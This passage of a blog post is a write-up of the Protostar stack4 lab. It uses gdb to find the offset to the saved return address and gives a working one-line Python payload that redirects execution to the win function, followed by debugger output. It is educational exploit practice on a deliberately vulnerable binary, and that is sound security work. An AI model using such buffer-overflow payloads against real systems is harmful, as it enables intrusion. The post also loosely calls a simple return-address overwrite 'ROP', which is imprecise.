id=dynamic-analysis>Dynamic Analysis<a href=#dynamic-analysis class=hanchor arialabel=Anchor>#</a></h2><p>Armed with our static analysis so far, we start our dynamic analysis. So, fire up gdb. We know that <code>main</code> code is like below:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>x08048408</span> <span style=color:#960050;background-color:#1e0010>&lt;</span><span style=color:#66d9ef>main</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0</span><span style=color:#960050;background-color:#1e0010>&gt;</span>:	<span style=color:#66d9ef>push</span>   <span style=color:#66d9ef>ebp</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>x08048409</span> <span style=color:#960050;background-color:#1e0010>&lt;</span><span style=color:#66d9ef>main</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>&gt;</span>:	<span style=color:#66d9ef>mov</span>    <span style=color:#66d9ef>ebp</span>,<span style=color:#66d9ef>esp</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>x0804840b</span> <span style=color:#960050;background-color:#1e0010>&lt;</span><span style=color:#66d9ef>main</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>3</span><span style=color:#960050;background-color:#1e0010>&gt;</span>:	<span style=color:#66d9ef>and</span>    <span style=color:#66d9ef>esp</span>,<span style=color:#ae81ff>0xfffffff0</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>x0804840e</span> <span style=color:#960050;background-color:#1e0010>&lt;</span><span style=color:#66d9ef>main</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>6</span><span style=color:#960050;background-color:#1e0010>&gt;</span>:	<span style=color:#66d9ef>sub</span>    <span style=color:#66d9ef>esp</span>,<span style=color:#ae81ff>0x50</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>x08048411</span> <span style=color:#960050;background-color:#1e0010>&lt;</span><span style=color:#66d9ef>main</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>9</span><span style=color:#960050;background-color:#1e0010>&gt;</span>:	<span style=color:#66d9ef>lea</span>    <span style=color:#66d9ef>eax</span>,[<span style=color:#66d9ef>esp</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0x10</span>]
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>x08048415</span> <span style=color:#960050;background-color:#1e0010>&lt;</span><span style=color:#66d9ef>main</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>13</span><span style=color:#960050;background-color:#1e0010>&gt;</span>:	<span style=color:#66d9ef>mov</span>    <span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>esp</span>],<span style=color:#66d9ef>eax</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>x08048418</span> <span style=color:#960050;background-color:#1e0010>&lt;</span><span style=color:#66d9ef>main</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>&gt;</span>:	<span style=color:#66d9ef>call</span>   <span style=color:#ae81ff>0x804830c</span> &lt;<span style=color:#66d9ef>gets@plt</span>&gt;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>x0804841d</span> <span style=color:#960050;background-color:#1e0010>&lt;</span><span style=color:#66d9ef>main</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>21</span><span style=color:#960050;background-color:#1e0010>&gt;</span>:	<span style=color:#66d9ef>leave</span>  
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x0804841e</span> &lt;<span style=color:#66d9ef>main</span>+<span style=color:#ae81ff>22</span>&gt;:	<span style=color:#66d9ef>ret</span>    
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> <span style=color:#66d9ef>of</span> <span style=color:#66d9ef>assembler</span> <span style=color:#66d9ef>dump.</span>
</span></span></code></pre></div><p>We set breakpoints at few locations like below:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *0x08048408
</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>1</span> at 0x8048408: file stack4/stack4.c, line 12.
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *0x08048411
</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>2</span> at 0x8048411: file stack4/stack4.c, line 15.
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *0x08048418
</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>3</span> at 0x8048418: file stack4/stack4.c, line 15.
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *0x0804841d
</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>4</span> at 0x804841d: file stack4/stack4.c, line 16.
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *0x0804841e
</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>5</span> at 0x804841e: file stack4/stack4.c, line 16.
</span></span></code></pre></div><p>Now, we run the program till the first couple of breakpoints and analyze the registers/stack.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r
</span></span><span style=display:flex><span>Starting program: /opt/protostar/bin/stack4 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Breakpoint 1, main <span style=color:#f92672>(</span>argc<span style=color:#f92672>=</span>1, argv<span style=color:#f92672>=</span>0xbffff864<span style=color:#f92672>)</span> at stack4/stack4.c:12
</span></span><span style=display:flex><span>12	stack4/stack4.c: No such file or directory.
</span></span><span style=display:flex><span>	in stack4/stack4.c
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> info r
</span></span><span style=display:flex><span>eax            0xbffff864	-1073743772
</span></span><span style=display:flex><span>ecx            0xb0a7a13f	-1331191489
</span></span><span style=display:flex><span>edx            0x1	<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>ebx            0xb7fd7ff4	-1208123404
</span></span><span style=display:flex><span>esp            0xbffff7bc	0xbffff7bc
</span></span><span style=display:flex><span>ebp            0xbffff838	0xbffff838
</span></span><span style=display:flex><span>esi            0x0	<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>edi            0x0	<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>eip            0x8048408	0x8048408 &lt;main&gt;
</span></span><span style=display:flex><span>eflags         0x200246	<span style=color:#f92672>[</span> PF ZF IF ID <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>cs             0x73	<span style=color:#ae81ff>115</span>
</span></span><span style=display:flex><span>ss             0x7b	<span style=color:#ae81ff>123</span>
</span></span><span style=display:flex><span>ds             0x7b	<span style=color:#ae81ff>123</span>
</span></span><span style=display:flex><span>es             0x7b	<span style=color:#ae81ff>123</span>
</span></span><span style=display:flex><span>fs             0x0	<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>gs             0x33	<span style=color:#ae81ff>51</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> c
</span></span><span style=display:flex><span>Continuing.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Breakpoint 2, main <span style=color:#f92672>(</span>argc<span style=color:#f92672>=</span>1, argv<span style=color:#f92672>=</span>0xbffff864<span style=color:#f92672>)</span> at stack4/stack4.c:15
</span></span><span style=display:flex><span>15	in stack4/stack4.c
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> info r
</span></span><span style=display:flex><span>eax            0xbffff864	-1073743772
</span></span><span style=display:flex><span>ecx            0xb0a7a13f	-1331191489
</span></span><span style=display:flex><span>edx            0x1	<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>ebx            0xb7fd7ff4	-1208123404
</span></span><span style=display:flex><span>esp            0xbffff760	0xbffff760
</span></span><span style=display:flex><span>ebp            0xbffff7b8	0xbffff7b8
</span></span><span style=display:flex><span>esi            0x0	<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>edi            0x0	<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>eip            0x8048411	0x8048411 &lt;main+9&gt;
</span></span><span style=display:flex><span>eflags         0x200286	<span style=color:#f92672>[</span> PF SF IF ID <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>cs             0x73	<span style=color:#ae81ff>115</span>
</span></span><span style=display:flex><span>ss             0x7b	<span style=color:#ae81ff>123</span>
</span></span><span style=display:flex><span>ds             0x7b	<span style=color:#ae81ff>123</span>
</span></span><span style=display:flex><span>es             0x7b	<span style=color:#ae81ff>123</span>
</span></span><span style=display:flex><span>fs             0x0	<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>gs             0x33	<span style=color:#ae81ff>51</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/24x $esp
</span></span><span style=display:flex><span>0xbffff760:	0xb7fd7ff4	0xb7ec6165	0xbffff778	0xb7eada75
</span></span><span style=display:flex><span>0xbffff770:	0xb7fd7ff4	0x080495ec	0xbffff788	0x080482e8
</span></span><span style=display:flex><span>0xbffff780:	0xb7ff1040	0x080495ec	0xbffff7b8	0x08048449
</span></span><span style=display:flex><span>0xbffff790:	0xb7fd8304	0xb7fd7ff4	0x08048430	0xbffff7b8
</span></span><span style=display:flex><span>0xbffff7a0:	0xb7ec6365	0xb7ff1040	0x0804843b	0xb7fd7ff4
</span></span><span style=display:flex><span>0xbffff7b0:	0x08048430	0x00000000	0xbffff838	0xb7eadc76
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/4x $ebp
</span></span><span style=display:flex><span>0xbffff7b8:	0xbffff838	0xb7eadc76	0x00000001	0xbffff864
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>We can see that c runtime (or whatever it is that called the main function even if don&rsquo;t want to get ourselves into what that is) has the base pointer (ebp) as 0xbffff838 and this is preserved at 0xbffff7b8. Then, main updates the current stack pointer (esp) as the new ebp of main. After that, main aligns its esp to 16 byte width, thus wasting 8 bytes and then reserves a further 0x50 (80) bytes for its stack. After all these operations, the salient characteristics of main&rsquo;s stack frame are as below:</p><ul><li>Current stack top (esp) is 0xbffff760</li><li>Current base pointer (ebp) is 0xbffff7b8</li><li>Main&rsquo;s calling function&rsquo;s ebp is 0xbffff838 and preserved at 0xbffff7b8</li><li>Main&rsquo;s calling function&rsquo;s return address is saved one word before the ebp (as we know as part of the call instruction of calling program). Thus return address is 0xb7eadc76 as we can see at location 0xbffff7bc (previous_ebp + 0x4 = 0xbffff7b8 + 0x4). This address <code>0xbffff7bc</code> is the one that we want to overwrite with our intended address of <code>win</code> function so as to execute that instead of main&rsquo;s caller function.</li></ul><p>Now, run till the next breakpoint.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> c
</span></span><span style=display:flex><span>Continuing.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Breakpoint 3, 0x08048418 in main <span style=color:#f92672>(</span>argc<span style=color:#f92672>=</span>1, argv<span style=color:#f92672>=</span>0xbffff864<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    at stack4/stack4.c:15
</span></span><span style=display:flex><span>15	in stack4/stack4.c
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x $esp
</span></span><span style=display:flex><span>0xbffff760:	0xbffff770
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>So we see that the pointer address for storing the input string from <code>gets</code> is located at 0xbffff770 (since the argument to <code>gets</code> is the buffer address and it is passed at the top of the stack as we know from previous section). We can see how far away this is from the address we want to overwrite by subtracting it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>0xbffff7bc - 0xbffff770 <span style=color:#f92672>=</span> 0x4C <span style=color:#f92672>(</span>or <span style=color:#ae81ff>76</span> bytes<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>So, we know that the difference between our intended location and input buffer address is 76 bytes, so if we input 80 bytes, the 77th-80th bytes will overwrite the return address. We can now go for the win (pun intended) already but let&rsquo;s continue further to our rest of the breakpoints to confirm our theory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> c
</span></span><span style=display:flex><span>Continuing.
</span></span><span style=display:flex><span><span style=color:#ae81ff>12345678901234567890123456789012345678901234567890123456789012345678901234567890</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Breakpoint 4, main <span style=color:#f92672>(</span>argc<span style=color:#f92672>=</span>0, argv<span style=color:#f92672>=</span>0xbffff864<span style=color:#f92672>)</span> at stack4/stack4.c:16
</span></span><span style=display:flex><span>16	in stack4/stack4.c
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/24x $esp
</span></span><span style=display:flex><span>0xbffff760:	0xbffff770	0xb7ec6165	0xbffff778	0xb7eada75
</span></span><span style=display:flex><span>0xbffff770:	0x34333231	0x38373635	0x32313039	0x36353433
</span></span><span style=display:flex><span>0xbffff780:	0x30393837	0x34333231	0x38373635	0x32313039
</span></span><span style=display:flex><span>0xbffff790:	0x36353433	0x30393837	0x34333231	0x38373635
</span></span><span style=display:flex><span>0xbffff7a0:	0x32313039	0x36353433	0x30393837	0x34333231
</span></span><span style=display:flex><span>0xbffff7b0:	0x38373635	0x32313039	0x36353433	0x30393837
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> info r $ebp
</span></span><span style=display:flex><span>ebp            0xbffff7b8	0xbffff7b8
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> c
</span></span><span style=display:flex><span>Continuing.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Breakpoint 5, 0x0804841e in main <span style=color:#f92672>(</span>argc<span style=color:#f92672>=</span>Cannot access memory at address 0x3635343b
</span></span><span style=display:flex><span><span style=color:#f92672>)</span> at stack4/stack4.c:16
</span></span><span style=display:flex><span>16	in stack4/stack4.c
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> info r $ebp
</span></span><span style=display:flex><span>ebp            0x36353433	0x36353433
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> 
</span></span></code></pre></div><p>We continue and enter an 80 byte long pattern and can see the repeated pattern visible on the stack and the last 4 bytes <code>7890</code> (0x30393837 in little endian hex format) have overwritten the address. We also see that if we stop after the <code>leave</code> instruction, the value 0x36353433 from address 0xbffff7b8 has been popped back into ebp.</p><p>Now, we find out the address of the <code>win</code> function and use its address as the last 4 bytes in an 80 byte input to the program to crack it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x win
</span></span><span style=display:flex><span>0x80483f4 &lt;win&gt;:	0x83e58955
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> quit
</span></span><span style=display:flex><span>user@protostar:/opt/protostar/bin$ python -c <span style=color:#e6db74>&#39;print &#34;A&#34;*76+&#34;\xf4\x83\x04\x08&#34;&#39;</span> | ./stack4
</span></span><span style=display:flex><span>code flow successfully changed
</span></span><span style=display:flex><span>Segmentation fault
</span></span><span style=display:flex><span>user@protostar:/opt/protostar/bin$ 
</span></span></code></pre></div><h2 id=references--lessons-learnt>References / Lessons Learnt<a href=#references--lessons-learnt class=hanchor arialabel=Anchor>#</a></h2><p>In this article, we learnt:</p><ul><li>Getting information about different sections of a program in gdb</li><li>Searching for values in a section of the program through gdb</li><li>Extending our knowledge of stack/buffer overflow to override program execution by manipulating return address (Also known as ROP or Return Oriented Programming attack)</li><li>About stack frames and esp/ebp/eip registers</li></ul><p>You can refer to the below links for reading up more about some of the things discussed above. If you have any queries or suggestions, please leave a comment here or ping me <a href=https://twitter.com/shantanugoel/>@shantanugoel</a></p><ul><li><a href=https://en.wikipedia.org/wiki/Return-oriented_programming>Return Oriented Programming</a></li><li><a href=https://en.wikipedia.org/wiki/Function_prologue>Function Prologue</a></li><li><a href=https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames>Functions and Stack Frames</a></li></ul></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>¬© 2025 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>